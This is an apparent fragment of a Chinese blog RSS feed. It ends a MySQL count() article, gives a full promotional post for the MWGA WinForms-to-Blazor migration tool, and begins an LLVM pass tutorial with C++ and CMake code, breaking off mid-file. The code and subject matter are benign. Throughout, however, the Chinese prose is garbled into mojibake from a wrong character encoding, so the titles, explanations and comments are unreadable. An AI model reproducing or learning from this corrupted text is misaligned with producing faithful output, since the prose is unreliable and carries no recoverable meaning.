count(ç´¢å¼å)  -&gt; éNULLæ° -&gt; è¾æ¢ -&gt; æç´¢å¼æ¶å¯ç¨
    â  
count(æ®éå)  -&gt; éNULLæ° -&gt; ææ¢ -&gt; è°¨æä½¿ç¨
</code></pre>
<p>è®°ä½å£è¯ï¼<strong>"æ°æ»æ°ï¼ç¨æå·ï¼æ°éç©ºï¼ååå¥½ï¼æ°å­1ï¼è½é«æï¼ä¸æ¯æ åå«å½å®"</strong> ð¯</p>


</div>
<div id="MySignature" role="contentinfo">
    
<p>â¤ï¸ å¦æä½ åæ¬¢è¿ç¯æç« ï¼è¯·ç¹èµæ¯æï¼ ð åæ¶æ¬¢è¿å³æ³¨æçåå®¢ï¼è·åæ´å¤ç²¾å½©åå®¹ï¼</p>

<p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/sun-10387834/" target="_blank">ä½ç¥è®©ææ¥å·¡å±±</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/sun-10387834/p/19452600" target="_blank">https://www.cnblogs.com/sun-10387834/p/19452600</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 16:25">2026-02-02 16:25</span>&nbsp;
<a href="https://www.cnblogs.com/sun-10387834">ä½ç¥è®©ææ¥å·¡å±±</a>&nbsp;
éè¯»(<span id="post_view_count">0</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19452600);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19452600', targetLink: 'https://www.cnblogs.com/sun-10387834/p/19452600', title: 'ãé¢è¯é¢ãMySQL ä¸­ count(*)ãcount(1) å count(å­æ®µå) æä»ä¹åºå«ï¼' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ MWGAè®©åäº¿è¡ä»£ç å¨Webç«¯âå¤æ´»âï¼ ]]></title>
    <link>https://www.cnblogs.com/xdesigner/p/19565029</link>
    <guid>96613893f5a475bf08ba98d662373bb9</guid>
    <description>
    <![CDATA[ 
		<h2>
			<a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/xdesigner/p/19565029" title="åå¸äº 2026-02-02 16:09">
    <span role="heading" aria-level="2">MWGAè®©åäº¿è¡ä»£ç å¨Webç«¯âå¤æ´»âï¼</span>
    

</a>

		</h2>
		<div class="postText">    <div id="cnblogs_post_description" style="display: none">
        
        åäº¬é½æä¿¡æ¯ç åç MWGAââä¸æ¬¾è½å¤å¸®å©ä¼ä¸åå¼åèå°ä½¿ç¨GDI+ç»å¾çå¤æçä¼ ç»Winformsç¨åºå¿«éãä½ææ¬è¿ç§»å°Blazor WASMå¹³å°çè¿ç§»å·¥å·ï¼å®æç ´äºWinformsç¨åºé¾ä»¥è·¨å¹³å°ãééæ§å·®çå°å¢ï¼ä»éæä½ä¿®æ¹éï¼éå¸¸ä¸è¶è¿10%ï¼å°±è½å°ä¼ ç»Winformsç¨åºæ ç¼è½¬ä¸ºå¯ç½é¡µå è½½çBlazor WASMçæ¬ã
è¿æå³çï¼ä¼ä¸æ ééåä¸å¡é»è¾ï¼æ éå­¦ä¹ å¨æ°åç«¯æ¡æ¶ï¼æ´æ éæåé¢å¤çåç«¯å¼åäººåââä¸å¥ä»£ç ï¼åæ¶ç¼è¯ä¸º.exeä¸.wasmï¼åç«¯è¿è¡ï¼ä½éªä¸è´ï¼ä¸ºä¼ä¸èçå¤§éå¼åææ¬ä¸æ¶é´ï¼å°¤å¶ééå»çç­å¯¹ä¿¡åæè¿«åéæ±çè¡ä¸ï¼
    </div>
<div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ç¹å¤§åè®¯ï¼åäº¬é½æä¿¡æ¯ç åç&nbsp;MWGAââä¸æ¬¾è½å¤å¸®å©ä¼ä¸åå¼åèå°ä½¿ç¨GDI+ç»å¾çå¤æçä¼ ç»Winformsç¨åºå¿«éãä½ææ¬è¿ç§»å°Blazor WASMå¹³å°çè¿ç§»å·¥å·ï¼å®æç ´äºWinformsç¨åºé¾ä»¥è·¨å¹³å°ãééæ§å·®çå°å¢ï¼ä»éæä½ä¿®æ¹éï¼éå¸¸ä¸è¶è¿10%ï¼å°±è½å°ä¼ ç»Winformsç¨åºæ ç¼è½¬ä¸ºå¯ç½é¡µå è½½çBlazor WASMçæ¬ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">è¿æå³çï¼ä¼ä¸æ ééåä¸å¡é»è¾ï¼æ éå­¦ä¹ å¨æ°åç«¯æ¡æ¶ï¼æ´æ éæåé¢å¤çåç«¯å¼åäººåââä¸å¥ä»£ç ï¼åæ¶ç¼è¯ä¸º.exeä¸.wasmï¼åç«¯è¿è¡ï¼ä½éªä¸è´ï¼ä¸ºä¼ä¸èçå¤§éå¼åææ¬ä¸æ¶é´ï¼å°¤å¶ééå»çç­å¯¹ä¿¡åæè¿«åéæ±çè¡ä¸ï¼</span></p>
<h1><strong class="135brush" data-brushtype="text"><strong>ä¸ã</strong></strong><strong class="135brush" data-brushtype="text"><strong>æä½ä¿®æ¹ï¼æé«è¿å</strong></strong></h1>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">éè¿MWGAï¼åæ¬åªè½å¨Windowsæ¡é¢è¿è¡çWinformsç¨åºï¼æ ééåï¼å³å¯è½¬åä¸ºéè¿æµè§å¨è®¿é®çWebAssemblyåºç¨ãä»¥ä¸ä¸ºä¸ä¸ªæ¡ä¾å±ç¤ºï¼</span></p>
<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>æ¡ä¾ä¸ï¼ç»å¸æ«é·æ¸¸æï¼2500è¡ä»£ç ï¼</strong></span>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>å¾1ï¼winfromç</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>æ«é·æ¯ä¸ä¸ªç»å¸çWindowsæ¸¸æç¨åºï¼è¿æ¯ä¸ä¸ª10å¹´ååçWinformsç¨åºï¼åå«çº¦2500è¡C#ä»£ç ä»¥åè¥å¹²å¾çèµæºæä»¶</em></span></p>
<p><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115236297-958633113.png" alt="æ«é·æ¸¸æ" loading="lazy"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>å¾2ï¼è½¬æ¢å</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>æä»¬å¯¹æ§ä»£ç ä¿®æ¹äºä¸è¶è¿50è¡(å æ¯2%)å°±è®©åä¸å¥ä»£ç å¯ä»¥æ éä¿®æ¹å³å¯ç¼è¯æ .exe å.wasmæä»¶ã</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115330834-395365830.png" alt="å¾ç2" loading="lazy"></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ç»¼ä¸</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼1ï¼åé¡¹ç®ï¼</strong>10å¹´åç¼åçWinformsæ«é·æ¸¸æï¼ä¾èµGDI+è¿è¡çé¢ç»å¶ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼2ï¼è¿ç§»è¿ç¨ï¼</strong>ä½¿ç¨MWGAå¯¼å¥é¡¹ç®ï¼ä»ä¿®æ¹çº¦50è¡ä»£ç ï¼å æ¯2%ï¼ï¼ä¸»è¦ä½¿ç¨&nbsp;#if&nbsp; MWGA&nbsp;æ¡ä»¶ç¼è¯ï¼å°é¨ååæ­¥æ¹æ³æ¹ä¸ºå¼æ­¥ééã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼3ï¼ç»æï¼</strong>åä¸å¥ä»£ç æ éæ¹å¨ç»å¾é»è¾ï¼ç´æ¥ç¼è¯ä¸º.wasmæä»¶ï¼å¨ChromeãFirefoxãSafariç­æµè§å¨ä¸­å®ç¾è¿è¡ï¼çé¢ä¸äº¤äºä¸åçä¸è´ï¼</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">è¥æ²¡æMWGAï¼ç¨æ·è¿éä»åç«¯éåæ´ä¸ªæ¸¸æï¼èæ¶èåï¼ææ¬é«ãèç°å¨ï¼åå¼åäººåå¯ç´æ¥å¨Winformsé¡¹ç®ä¸ç»§ç»­è¿­ä»£ï¼åæ­¥çæç½é¡µçï¼</span></p>
<p>&nbsp;</p>
<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>æ¡ä¾äºï¼æºè½è®¡ç®å¨ï¼460è¡ä»£ç ï¼</strong></span>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>å¾3ï¼winfromç</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><em>è¿æ¯ä¸ä¸ªWinform.NETçè®¡ç®å¨ç¨åºï¼åå«460è¡C#ä»£ç </em></span></p>
<p><span style="font-size: 16px"><em><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115427518-107951139.png" alt="è®¡ç®å¨" loading="lazy"></em></span></p>
<p><span style="font-size: 16px"><em>å¾4ï¼è½¬æ¢å</em></span></p>
<p><span style="font-size: 16px"><em>ä»£ç æªåä»»ä½ä¿®æ¹ï¼åå©MWGAï¼å®å¨Blazor WASMä¸­è¿è¡çé¢å¦ä¸å¾æç¤ºã</em></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202601/12406-20260119115505304-749089367.png" alt="å¾ç4" loading="lazy"></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ç»¼ä¸</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼1ï¼åé¡¹ç®ï¼</strong>Winformsè®¡ç®å¨ï¼æ¯æçªä½ææ½èªéåºå¸å±ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼2ï¼è¿ç§»è¿ç¨ï¼</strong>ä»£ç é¶ä¿®æ¹ï¼ç´æ¥éè¿MWGAè¿ç§»è³Blazor WASMã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼3ï¼ç»æï¼</strong>å¨æµè§å¨ä¸­è¿è¡ï¼çªä½å¤§å°è°æ´ãæé®èªéåºå¸å±ç­è¡ä¸ºå®å¨ä¿çï¼ç¨æ·ä½éªæ æè¿ç§»ï¼</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">&nbsp;</span></p>
<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>æ¡ä¾ä¸ï¼æ¶é´è½´äº§åï¼1%ä»£ç ä¿®æ¹éï¼</strong></span>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">æ¶é´è½´äº§åæ¯åäº¬é½æå¬å¸çä¸ä¸ªWinFormsè½¯ä»¶äº§åï¼ç°å·²å¼æºï¼è¿æ¯ä¸ä¸ªé¢åå»é¢çä¸ä¸è½¯ä»¶äº§åã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160302680-1041140241.png" alt="å¾ç5" loading="lazy"></strong></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>åé¡¹ç®ï¼</strong>è¿æ¯ä¸ä¸ª7ä¸è¡ä»£ç çWinFormså»çç»å¾è½¯ä»¶ï¼éåº¦ä¾èµWindowsçGDI+å¾å½¢åºã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>è¿ç§»è¿ç¨ï¼</strong>åå©MWGAæ¡æ¶ï¼éè¿æ·»å æå°éï¼çº¦1%ï¼çå¼æ­¥ééä»£ç ï¼ä½¿åä¸å¥ä»£ç è½åæ¶ç¼è¯ä¸ºæ¡é¢ç¨åºåWebAssemblyåºç¨ã</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>è¿ç§»ç»æï¼</strong>è¯¥è½¯ä»¶æåå¨æµè§å¨ä¸­åæ ·è¿è¡ï¼è¯æäºæ ééåå³å¯å°å¤æC#æ¡é¢è½¯ä»¶ä½ææ¬è¿ç§»è³Webå¹³å°ã</span></p>
<p><strong class="135brush" data-brushtype="text"><strong><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160321078-1847393760.jpg" alt="å¾ç6" loading="lazy"></strong></strong></p>
<h1><strong class="135brush" data-brushtype="text"><strong>äºãå¹¿æ³éé</strong></strong></h1>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">MWGAå¨é¢å¼å®¹å¤å¹³å°æä½ç³»ç»ï¼åæ¬Windows 7/10/11ãLinuxãAndroidãmacOSä»¥åç»ä¿¡UOSãéºéºãæ¹å¾·ç­å½äº§ä¿¡åç³»ç»ãåºç¨å®å¨åºäºæµè§å¨è¿è¡ï¼ä¸ä¾èµç¹å®Windowsçæ¬ï¼ä¹æ éå®è£ç¬ç«å®¢æ·ç«¯ãè½¬æ¢åçåºç¨å¯ç´æ¥é¨ç½²äºæ åWebæå¡å¨ï¼ç¨æ·éè¿Chromeï¼v95+ï¼ãEdgeãFirefoxï¼v133+ï¼ãSafariç­ä¸»æµæµè§å¨å³å¯è®¿é®ï¼æ éæ´æ¢ç¡¬ä»¶æåçº§ç³»ç»ï¼è½»æ¾å®ç°åºç¨ç°ä»£åä¸åè§åã</span></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ï¼1ï¼å¨Windows 7ä¸­è¿è¡çé¢å¦ä¸ï¼</span></strong></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160401296-9140087.jpg" alt="å¾ç7" loading="lazy"></span></strong></p>
<p>&nbsp;</p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼2ï¼å¨è°·æ­æµè§å¨ä¸­è¿è¡çææå¦ä¸ï¼</strong></span></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160426956-315964826.jpg" alt="å¾ç8" loading="lazy"></span></strong></p>
<p>&nbsp;</p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ï¼3ï¼å¨Firefoxä¸­è¿è¡çææï¼</span></strong></p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160758522-570347954.jpg" alt="å¾ç9" loading="lazy"></span></strong></p>
<p>&nbsp;</p>
<p><strong><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ï¼4ï¼å¨è¹æç³»ç»ä¸­è¿è¡çææï¼</span></strong></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160815014-1508511479.jpg" alt="å¾ç10" loading="lazy"></strong></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼5ï¼å¨è¹æpadä¸­è¿è¡çææï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/XIfaemfq_Q74w.jpg?auth_key=1770566399-0-0-85b73e984965158d622f0244d80518dc" alt="å¾ç11.jpg"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼6ï¼å¨åä¸ºpadä¸­è¿è¡çææï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/RFUdjSbk_GMNP.jpg?auth_key=1770566399-0-0-086fb31ad63bdcef31fbcf8017898bcd" alt="å¾ç12.jpg"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼7ï¼å¨è¹æææºç«¯è¿è¡ææå¦ä¸ï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/yH2Z4tOe_K8re.png?auth_key=1770566399-0-0-9319348da9ee7e23d623be43400fcbb6" alt="å¾ç13.png"></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>ï¼8ï¼å¨å®åææºç«¯è¿è¡ææå¦ä¸ï¼</strong></span></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/HfAKpuk9_92EL.jpg?auth_key=1770566399-0-0-36fcf28439eb68eb75956bd8f7c11587&amp;x-bce-process=image/crop,x_0,y_0,w_394,h_337" alt="å¾ç14.jpg"></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/LSFhnIMh_zEkM.jpg?auth_key=1770566399-0-0-13d14553adfd143ec49f771e0423d178" alt="å¾ç15.jpg"></p>
<h1>&nbsp;ä¸ã<strong class="135brush" data-brushtype="text"><strong>è½¬ååçä¼å¿ï¼ä¸ºä»ä¹éæ©MWGAï¼</strong></strong></h1>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>1ãè¿ç§»æçé«ï¼</strong>å¯¼å¥å³æ¸²æï¼ééå¿«ï¼ä»WinFormså°Webä»éæ°å°æ¶</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>2ãä»£ç æ¹å¨å°ï¼</strong>å¹³åä¿®æ¹éï¼10%ï¼å¤§éä¸å¡é»è¾ä¸ç»å¾ä»£ç å¯ç´æ¥å¤ç¨</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>3ãææ¯é¨æ§ä½ï¼</strong>æ éBlazoræåç«¯ç»éªï¼WinFormså¼åäººåç´æ¥ä¸æ</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>4ãææ¬æä½ï¼</strong>çå»éåäººåãå­¦ä¹ ææ¬ä¸é¿æç»´æ¤ææ¬</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>5ãæ¯æGDI+ç»å¾ï¼</strong>ç³»ç»ç»å¾ä»£ç æ ééæï¼ç´æ¥è¿ç§»è³Canvasæ¸²æ</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px"><strong>6ãè·¨å¹³å°è¿è¡ï¼</strong>æ¯æWindowsãLinuxãAndroidåä¸»æµå½äº§ç³»ç»</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">å¯¹äºä¼ä¸èè¨ï¼å°Winformsåºç¨éåä¸ºWebçéå¸¸æå³çä»é¶å¼å§ãé«æçææ¬ä¸æ¼«é¿çå¨æãMWGAçåºç°ï¼å½»åºæ¹åäºè¿ä¸å±é¢ãä¼ä¸æ éæèä¸é¨çåç«¯å¼åå¢éï¼æ éåºå¼ç»è¿å¤å¹´ç§¯ç´¯çä¸å¡é»è¾ä»£ç ãåªéå¨åæWinformsé¡¹ç®åºç¡ä¸ï¼éè¿MWGAè¿è¡è½¬æ¢ï¼å³å¯åæ­¥è·å¾Webçæ¬ãæªæ¥åè½è¿­ä»£ï¼ä¹åªéå¨Winformsé¡¹ç®ä¸­ä¿®æ¹ä¸æ¬¡ï¼ä¾¿è½åæ­¥è³Webç«¯ï¼æå¤§éä½äºç»´æ¤ææ¬ååç«¯ä¸ä¸è´çé£é©ã</span></p>
<h1>&nbsp;åã<strong class="135brush" data-brushtype="text"><strong>ç«å³ä½éª</strong></strong></h1>
<p>M<span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">WGAç°å·²å¼æ¾ä¸è½½ä¸è¯ç¨ï¼æ¬¢è¿è®¿é®æä»¬çGitHubä¸»é¡µè·åæ¼ç¤ºé¡¹ç®ä¸ä½¿ç¨æåï¼</span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ð ä¸è½½å°åï¼<a href="https://github.com/dcsoft-yyf/MWGA" target="_blank" rel="noopener nofollow">https://github.com/dcsoft-yyf/MWGA</a></span></p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">ð§ èç³»æä»¬ï¼<a href="mailto:28348092@qq.com" rel="noopener nofollow">28348092@qq.com</a></span></p>
<p>&nbsp;</p>
<p><span style="font-family: &quot;Microsoft YaHei&quot;; font-size: 16px">è¿ç§»ååä»£ç éå¯¹æ¯å¾ï¼å¾ç¤ºä¸ºç¤ºä¾ï¼å®éä¿®æ¹éä¾é¡¹ç®å¤æåº¦èå®ï¼ï¼</span></p>
<p><strong class="135brush" data-brushtype="text"><img src="https://img2024.cnblogs.com/blog/12406/202602/12406-20260202160902626-1390836694.png" alt="å¾ç16" loading="lazy"></strong></p>
<p><strong class="135brush" data-brushtype="text">END</strong></p>
<p><img src="https://bexp.135editor.com/files/users/1658/16581196/202602/7rG2PuJH_shWu.jpg?auth_key=1770566399-0-0-5bf797861484c19f5b5976bcb153f14d" width="145" height="145" data-ratio="1" data-w="344"></p>
<p><strong class="135brush" data-brushtype="text">æ«ç å³æ³¨</strong></p>
<p><span class="135brush" data-brushtype="text">åäº¬é½æä¿¡æ¯</span></p>
<p><span class="135brush" data-brushtype="text">ä¸èµ·å±åç¾å¥½æªæ¥</span></p>

</div>
<div class="clear"></div>
</div>
		<p class="postfoot">
			posted on 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-02-02 16:09">2026-02-02 16:09</span>&nbsp;
<a href="https://www.cnblogs.com/xdesigner">è¢æ°¸ç¦ çµå­çåï¼å»çä¿¡æ¯å</a>&nbsp;
éè¯»(<span id="post_view_count">116</span>)&nbsp;
è¯è®º(<span id="post_comment_count">1</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19565029);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19565029', targetLink: 'https://www.cnblogs.com/xdesigner/p/19565029', title: 'MWGAè®©åäº¿è¡ä»£ç å¨Webç«¯âå¤æ´»âï¼' })">ä¸¾æ¥</a>

		</p>
	 ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ LLVM Passå¿«éå¥é¨(äº)ï¼è¿è¡ç¬¬ä¸ä¸ªpass ]]></title>
    <link>https://www.cnblogs.com/ClownLMe/p/19564658</link>
    <guid>a088b9405f63dc0c9af5134a182f8de0</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/ClownLMe/p/19564658" title="åå¸äº 2026-02-02 15:17">
    <span role="heading" aria-level="2">LLVM Passå¿«éå¥é¨(äº)ï¼è¿è¡ç¬¬ä¸ä¸ªpass</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<h1 id="è®¤è¯passå±çº§ç»æ">è®¤è¯Passå±çº§ç»æ</h1>
<p><strong>Pass</strong>èå´ä»ä¸å°ä¸ä¸å±åä¸º5ä¸ªå±çº§ï¼</p>
<ul>
<li><strong>æ¨¡åå±çº§</strong>ï¼åä¸ª<code>.ll</code>æ<code>.bc</code>æä»¶</li>
<li><strong>è°ç¨å¾å±çº§</strong>ï¼å½æ°è°ç¨çå³ç³»ã</li>
<li><strong>å½æ°å±çº§</strong>ï¼åä¸ªå½æ°ã</li>
<li><strong>åºæ¬åå±çº§</strong>ï¼åä¸ªä»£ç åãä¾å¦Cè¯­è¨ä¸­<code>{}</code>æ¬èµ·æ¥çæå°ä»£ç ã</li>
<li><strong>æä»¤å±çº§</strong>ï¼åä¸ªIRæä»¤ã</li>
</ul>
<p><mark><strong>æ³¨æï¼ä¸é¢ä»£ç æå¥½ä¸è¦ç¨ä¸­æï¼ä½¿ç¨èµ·æ¥éå¸¸éº»ç¦ï¼æ§å¶å°ï¼ç¼è¯ï¼ç®æ æä»¶çç¼ç ä¸åä¼é æä¹±ç ã</strong></mark></p>
<h1 id="é¡¹ç®ç®å½å¦ä¸">é¡¹ç®ç®å½å¦ä¸</h1>
<pre><code>/MyProject
âââ CMakeLists.txt # CMake éç½®æä»¶
âââ build/ #æå»ºç®å½
â   âââ test.c #æµè¯ç¼è¯ä»£ç 
âââ mypass1.cpp # pass é¡¹ç®ä»£ç 
</code></pre>
<h3 id="ä¸æµè¯ä»£ç ç¤ºä¾">ä¸ï¼æµè¯ä»£ç ç¤ºä¾</h3>
<p><strong>test.c</strong></p>
<pre><code class="language-c">#include &lt;stdio.h&gt;

void secret_function() {
&nbsp; &nbsp; printf("I am secret\n");
}

int main() {
&nbsp; &nbsp; secret_function();
&nbsp; &nbsp; return 0;
}
</code></pre>
<h3 id="äºpassç¼å">äºï¼Passç¼å</h3>
<p>é¡¹ç®æè¿°ï¼éè¿è§£æä¸é¢ä»£ç çIRï¼å°ä¸é¢ä»£ç ä¸­çå½æ°åæå°åºæ¥ã<br>
<strong>mypass1.cpp</strong></p>
<pre><code class="language-c">#include "llvm/IR/PassManager.h"
#include "llvm/Passes/PassBuilder.h"
#include "llvm/Passes/PassPlugin.h"
#include "llvm/Support/raw_ostream.h"

using namespace llvm;

// è¿ä¸ªç»æä½åºæ¬æ¯åºå®æ¨¡æ¿
namespace {
    struct mypass1 : public PassInfoMixin&lt;mypass1&gt; {
	    //å½æ°åè°ï¼æ¯æ¬¡éå°å½æ°æ¶è°ç¨ï¼è¿éæéè½½ï¼å­å¨å¤ç§å¥å£æ¹å¼ï¼å¯ä»¥ä»¥æ¨¡åä¸ºå¥å£ï¼
        PreservedAnalyses run(Function &amp;F, FunctionAnalysisManager &amp;) {
	        //è¿éæ¯ä¸»è¦çé»è¾ä»£ç ï¼æä»¬ä¸»è¦å­¦ä¹ çä»£ç å¨è¿
	        
	        //æå°åºå½åå½æ°çåå­
            errs() &lt;&lt; "Found Function: " &lt;&lt; F.getName() &lt;&lt; "\n";
            
            //åªè¯»æ¶è¿åï¼PreservedAnalyses::all()
            //å­å¨ä¿®æ¹æ¶ï¼PreservedAnalyses::none()
            return PreservedAnalyses::all();
        }
    };

}

//ä¸é¢åºæ¬ä¸æ¯åºå®çæ¨¡æ¿ï¼æ¯ä¸ªpassæ²¡ä»ä¹ååï¼å¯ä»¥ç´æ¥å¤å¶ç²è´´ï¼æèèçã
//ç´æ¥ä½¿ç¨éè¦ä¿®æ¹çæ¯ä¸é¢ç&lt;æ¨¡ååç§°ï¼çæ¬å·ï¼è°ç¨åæ°ï¼åè°ç¨çpassç»æä½&gt;
extern "C" LLVM_ATTRIBUTE_WEAK::llvm::PassPluginLibraryInfo
llvmGetPassPluginInfo() {
    return {
        LLVM_PLUGIN_API_VERSION,//çæ¬ä¿¡æ¯
        "mypass1",//æ¨¡åä¿¡æ¯ï¼èªå®ä¹
        "v0.1",//çæ¬å·ï¼èªå®ä¹
        [](PassBuilder &amp;PB) {
            PB.registerPipelineParsingCallback(
                [](StringRef Name, FunctionPassManager &amp;FPM,
                   ArrayRef&lt;PassBuilder::PipelineElement&gt;) {
                    if (Name == "mypass1") {//è°ç¨åæ°
                        FPM.addPass(mypass1());//ä¸é¢passç»æä½
                        return true;
                    }
                    return false;
                }
            );
        }
    };
}
</code></pre>
<h3 id="ä¸passçæå»º">ä¸ï¼Passçæå»º</h3>
<p>æå»ºLLVM Passéè¦å<code>CMakeLists.txt</code>æå»ºå£°æ</p>
<h5 id="1-éç½®cmakeéç½®æä»¶">1. éç½®CMakeéç½®æä»¶</h5>
<p><strong>CMakeLists.txt</strong><br>
ä¸é¢ç<code>cmake</code>éç½®å¯ä»¥ç´æ¥æ¿å»ç¨ï¼æå·²ç»æ æ³¨å¥½éè¦ä¿®æ¹çä½ç½®</p>
<pre><code class="language-python">#cmake çæ¬ï¼å¯éè¿ cmake --version å¤æ­
cmake_minimum_required(VERSION 4.1.1) #----&gt;ä¿®æ¹ cmakeçæ¬å·
#é¡¹ç®åå­
project(mypass1) #----&gt;ä¿®æ¹ é¡¹ç®åç§°

#å¯¼å¥é¡¹ç®ç LLVM cmake éç½®æä»¶è·¯å¾(å¦ææ ¹æ®æä¹åæç« å®è£è¿éå°±ç¸å)
set(LLVM_DIR "D:/LLVM/llvm-project/build/lib/cmake/llvm")#----&gt;ä¿®æ¹ llvm cmakeéç½®è·¯å¾
#å¯»æ¾ LLVM çåæä»¶
#REQUIRED æ¾ä¸å° LLVM ååæ­¢æå»º
#å¼ºå¶ä½¿ç¨ LLVM å®è£æ¶çæçéç½®æä»¶è¿è¡å®ä½
find_package(LLVM REQUIRED CONFIG)
#å° LLVM ç CMake æ¨¡åè·¯å¾æ·»å å°å½å CMake æç´¢è·¯å¾ä¸­ï¼ä»¥ä¾¿åç»­ä½¿ç¨ include(AddLLVM)ã
list(APPEND CMAKE_MODULE_PATH "${LLVM_CMAKE_DIR}")

#å¼å¥ LLVM æä¾çä¸ç¨ CMake å®
include(AddLLVM)
